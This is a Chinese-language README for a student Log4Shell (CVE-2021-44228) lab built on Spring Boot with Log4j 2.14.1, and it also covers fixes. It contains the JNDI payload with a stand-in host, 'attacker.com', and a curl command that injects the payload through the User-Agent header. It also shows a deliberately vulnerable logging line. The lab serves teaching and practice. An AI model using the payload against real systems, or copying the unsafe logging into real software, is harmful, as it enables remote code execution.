# Log4Shell CVE-2021-44228 實驗分析

## 📋 項目簡介

這是一個用於教學 **Log4Shell 漏洞 (CVE-2021-44228)** 的網路安全靶機練習項目。透過實際運行易受攻擊的應用程式，學習者可以理解和演練如何利用 Apache Log4j 2 中的遠端程式碼執行漏洞。

- **作者**：Zhuo Yi-Xuan
- **學號**：412631011
- **用途**：網路安全教育與 CTF 練習
- **框架**：Spring Boot 2.5.6 + Apache Log4j 2.14.1

---

## 🛡️ 漏洞實戰報告：Log4Shell (CVE-2021-44228)
https://hackmd.io/@Eevee940323/H1ooVxsbMg


### 環境需求

- Java 11 或以上版本
- Maven 3.6 或以上版本
- Linux/macOS/Windows

### 安裝與運行

1. **複製或下載項目**
   ```bash
   git clone https://github.com/moemuom9488m/-.git
   cd -
   ```

2. **編譯項目**
   ```bash
   mvn clean compile
   ```

3. **運行應用**
   ```bash
   mvn spring-boot:run
   ```

4. **驗證運行**
   ```
   應用將在 http://localhost:9090 啟動
   flag.txt 將自動生成在伺服器目錄中
   ```

---

## 🎯 靶機目標

**挑戰目標**：利用 CVE-2021-44228 (Log4Shell) 漏洞讀取伺服器上的 `flag.txt` 文件。

**提示**：目標是利用 Log4Shell JNDI 注入漏洞，通過修改 HTTP 請求頭執行任意代碼。

---

## 📁 項目結構

```text
.
├── README.md                 # 項目說明文檔（本文件）
├── pom.xml                   # Maven 項目配置文件，定義依賴與構建設定
└── src                       # 專案原始碼目錄
    └── main
        ├── java
        │   └── Mavenproject20.java       # Java 主程式，包含 Spring Boot 啟動與漏洞觸發點
        └── resources
            └── application.properties    # Spring Boot 應用配置參數
```

---

## 🔴 漏洞詳解

### 什麼是 Log4Shell？

Log4Shell (CVE-2021-44228) 是 Apache Log4j 2 框架中的遠端程式碼執行漏洞。當應用程式將使用者輸入直接記錄到日誌時，攻擊者可以注入惡意的 JNDI (Java Naming and Directory Interface) 表達式，造成任意代碼執行。

### 漏洞觸發點

```java
// Mavenproject20.java 第 43 行
logger.error("Received request from User-Agent: " + userAgent);
```

應用程式會將 HTTP 請求頭中的 `User-Agent` 參數直接記錄，這成為了漏洞的入口點。

### 易受攻擊的依賴版本

```xml
<!-- pom.xml 中使用的版本 -->
<log4j2.version>2.14.1</log4j2.version>
```

Apache Log4j 2.14.1 是已知存在 Log4Shell 漏洞的版本。官方已在 2.16.0 版本中修復此漏洞。

---

## 💡 利用方式示例

### 基本概念

攻擊者可以通過 JNDI 注入語法在日誌中觸發遠端資源加載：

```
${jndi:ldap://attacker.com/Evil}
```

### 實踐步驟

1. **設置本地 LDAP 伺服器**（或使用現成工具如 ysoserial）

2. **構造惡意請求**
   ```bash
   curl -H "User-Agent: \${jndi:ldap://[your-ldap-server]/[malicious-class]}" \
        http://localhost:9090/
   ```

3. **執行代碼並讀取 flag.txt**

> ⚠️ **注意**：此示例僅供教育目的。請在隔離的測試環境中進行。

---

## 🛡️ 防護與修復方案

### 短期修復

1. **升級 Log4j 版本**
   ```xml
   <log4j2.version>2.17.0</log4j2.version>
   ```

2. **禁用 JNDI 功能**
   ```properties
   log4j2.formatMsgNoLookups=true
   ```

### 長期最佳實踐

1. ✅ 定期更新依賴庫
2. ✅ 避免將使用者輸入直接記錄到日誌
3. ✅ 使用參數化日誌而非字符串連接
4. ✅ 實施輸入驗證與過濾

---

## 📚 學習資源

- [Apache Log4j 安全公告](https://logging.apache.org/log4j/2.x/security-announcements.html)
- [CVE-2021-44228 詳細説明](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [JNDI 注入原理](https://github.com/X1r0z/ActiveMQ-RCE)

---

## 📝 項目文件説明

### pom.xml
Maven 項目配置文件，定義項目依賴和構建配置：
- Spring Boot 父項目依賴
- Spring Boot Web 啟動器
- Log4j 2 依賴（易受攻擊的 2.14.1 版本）

### application.properties
Spring Boot 應用配置文件：
```properties
server.port=8083
```
（注：實際運行時在代碼中被設置為 9090）

### Mavenproject20.java
主程序文件，包含：
- Spring Boot 應用入口點
- 漏洞觸發的 REST 端點 (`/`)
- 自動生成 `flag.txt` 的啟動邏輯

---

## 🎓 使用場景

1. **網路安全課程教學** - 演示真實漏洞原理
2. **CTF 競賽練習** - 漏洞利用技能訓練
3. **安全審計培訓** - 代碼審查與漏洞識別
4. **應急響應演練** - 漏洞檢測與修復流程

---

## ⚠️ 免責聲明

- 本項目**僅供教育和授權測試之用**
- 禁止用於任何非法或未授權的活動
- 使用者需在隔離的測試環境中運行
- 作者不對任何濫用或損害負責

---

## 📞 聯繫與反饋

如有問題、建議或改進意見，歡迎透過 GitHub Issues 提出。

---

**最後更新**：2026年6月13日

**授權**：教育用途
